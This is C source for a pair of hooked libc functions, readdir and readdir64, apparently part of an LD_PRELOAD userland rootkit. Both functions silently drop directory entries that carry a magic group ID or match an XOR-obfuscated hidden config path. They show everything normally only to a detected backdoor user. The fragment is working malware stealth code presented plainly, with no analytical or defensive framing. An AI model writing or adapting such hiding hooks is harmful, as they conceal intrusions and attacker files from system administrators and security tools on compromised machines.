struct dirent *readdir(DIR *dirp)
{
    HOOK(o_readdir, CREADDIR);
    struct dirent *dir;
    char path[4097],*sysd_conf=strdup(SYSD_CONF); xor(sysd_conf);

    do{
        dir = o_readdir(dirp);
        if(is_bdusr()) { CLEAN(sysd_conf); return dir; }
        if(dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name, "/\0") == 0)) continue;
        if(dir != NULL) snprintf(path, 4096, "%s/%s", gdirname(dirp), dir->d_name);
    } while(dir && (hxstat(path, MGID, 32) || strstr(path,sysd_conf)));

    CLEAN(sysd_conf);
    return dir;
}

struct dirent64 *readdir64(DIR *dirp)
{
    HOOK(o_readdir64, CREADDIR64);
    struct dirent64 *dir;
    char path[4097],*sysd_conf=strdup(SYSD_CONF); xor(sysd_conf);

    do {
        dir = o_readdir64(dirp);
        if(is_bdusr()) { CLEAN(sysd_conf); return dir; }
        if(dir != NULL && (strcmp(dir->d_name, ".\0") == 0 || strcmp(dir->d_name, "/\0") == 0)) continue;
        if(dir != NULL) snprintf(path, 4096, "%s/%s", gdirname(dirp), dir->d_name);
    } while(dir && (hxstat(path, MGID, 32) || strstr(path,sysd_conf)));

    CLEAN(sysd_conf);
    return dir;
}
